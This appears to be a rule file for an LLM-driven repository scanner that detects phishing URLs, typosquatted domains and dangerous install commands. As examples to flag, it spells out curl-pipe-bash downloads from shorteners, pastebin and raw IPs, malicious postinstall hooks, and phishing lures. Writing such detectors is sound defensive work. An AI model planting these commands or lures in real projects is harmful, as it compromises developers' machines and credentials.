---
id: phishing-urls
title: Phishing / Malicious URLs in Code
stages: [llm-scan, validate]
severity: medium
description: Detects typosquatted domains, URL shorteners hiding malicious destinations, suspicious curl-pipe-bash install instructions, and social engineering content embedded in repository files targeting developers.
---

# Phishing URLs in Code Detector

## Detection Prompt

```
You are hunting for malicious or phishing URLs embedded in code, documentation, scripts, and commit messages. The target victims are DEVELOPERS who read the repo (not end users) — attackers embed these to compromise developer machines or steal credentials during onboarding.

Open and scan these file types:
  README.md, README.rst, INSTALL.md, CONTRIBUTING.md, SETUP.md
  All *.md, *.rst, *.txt documentation files
  All shell scripts: *.sh, *.bash, Makefile, install.sh, setup.sh, bootstrap.sh
  package.json "scripts" section, particularly: "postinstall", "prepare", "preinstall"
  .github/ISSUE_TEMPLATE/*, .github/PULL_REQUEST_TEMPLATE.md
  Commit messages in CHANGELOG.md

PATTERN 1 — Typosquatted domains (visually similar to legitimate sites):
  Flag domains that resemble but are NOT these legitimate sites:
  - github.com → gíthub.com, github.co, guthub.com, gi7hub.com, githube.com, qithub.com
  - npmjs.com → npmj.com, npm-js.com, npmsjs.com
  - pypi.org → pyp1.org, pypi.com (NOT .org), pypie.org
  - golang.org → g0lang.org, golanq.org
  - docker.com → d0cker.com, dockerr.com
  - google.com → g00gle.com, gooogle.com, gooqle.com
  - microsoft.com → rnicrosoft.com, micros0ft.com, microsofft.com
  ANY domain where: one letter is replaced with a number (0→o, 1→l, 3→e), letters transposed, extra letter added, or TLD changed (.co vs .com, .org vs .io)

PATTERN 2 — URL shorteners hiding destination:
  bit.ly/*, tinyurl.com/*, t.co/*, ow.ly/*, rb.gy/*, short.io/*, tiny.cc/*
  These should NEVER appear in: install scripts, package postinstall hooks, Makefiles
  In documentation, flag URL shorteners unless they demonstrably link to the project's own resources

PATTERN 3 — Dangerous curl-pipe-bash install patterns:
  SAFE (official project's own domain): curl https://install.myproject.org | bash
  SUSPICIOUS: curl https://bit.ly/2xXyz | bash  ← URL shortener hiding destination
  SUSPICIOUS: curl https://pastebin.com/raw/abc123 | bash  ← pastebin = unverified
  SUSPICIOUS: curl https://raw.githubusercontent.com/unknown-user/repo/main/install.sh | bash ← unknown user
  SUSPICIOUS: wget -O - https://notgithub.com/setup | sh  ← typosquatted

  In package.json "scripts":
  "postinstall": "curl https://tracker.io/pixel?repo=$(whoami) -s -o /dev/null"  ← telemetry without consent
  "postinstall": "bash -c 'curl http://external-site.com/install.sh | sh'"  ← backdoor in postinstall

PATTERN 4 — IP addresses as URLs in documentation:
  curl http://185.220.101.x/malware.sh | bash  ← raw IP download
  wget http://45.33.x.x/payload  ← direct IP download in scripts
  IP addresses (not 127.0.0.1, not 10.x, not 192.168.x) in download scripts → FLAG

PATTERN 5 — Social engineering content targeting developers:
  "Your npm token has expired — please re-authenticate: https://npm-login.support/refresh"
  "Free API key available at: https://openai-keys.io/get-key"
  "Download the updated SDK from: https://g00gle-cloud.com/sdk"
  "URGENT: Security vulnerability in your account — verify at https://github-security.com"

PATTERN 6 — Misleading links (link text ≠ href):
  [github.com/legitimate/repo](https://evil.com/malware)  ← text is legit, link is evil
  [Click here for official docs](https://scammer.io/phish)
  [Download latest release](https://evil.com/setup.sh)

PATTERN 7 — Fake credentials / credential harvesting:
  "Login to our dashboard: https://dashboard.myapp.com — use default credentials admin/admin123"
  Credentials embedded in READMEs pointing to external services (not localhost)
  "Test API key: sk-test-abc123" pointing to a webhook URL that captures the key when copy-pasted and used
```

## Validation Prompt

```
Suspicious URL/content at {file}:{line}.

Snippet:
{snippet}

Answer ALL questions:
1. Is the domain a known legitimate site, or does it visually resemble one (typosquatting)?
2. Is a URL shortener used? Can the destination be determined without clicking?
3. Is this a curl-pipe-bash pattern? Is the source domain controlled by the project (official domain, official GitHub org)?
4. Is there a mismatch between displayed link text and the actual href URL?
5. What would happen to a developer who follows this link or runs this command?

Respond with JSON: {"confirmed": true|false, "confidence": 0.0-1.0, "reason": "..."}
```

## FP Heuristics

- Official project's own domain in curl install scripts: `curl https://get.rustup.rs | sh` (official Rust installer) — acceptable
- Known legitimate URL shorteners used by the project itself for tracking (e.g., in official release announcements) — context matters
- IP addresses in local development documentation (127.0.0.1, localhost, 192.168.x.x) — not malicious
- Example/placeholder URLs in code (example.com, test.com per RFC 2606) — safe
- Links to GitHub, npm, PyPI, Docker Hub, official vendor documentation — safe if the domain is exact and unmodified
- OAuth/SSO redirect URIs configured in the code — these are expected URLs
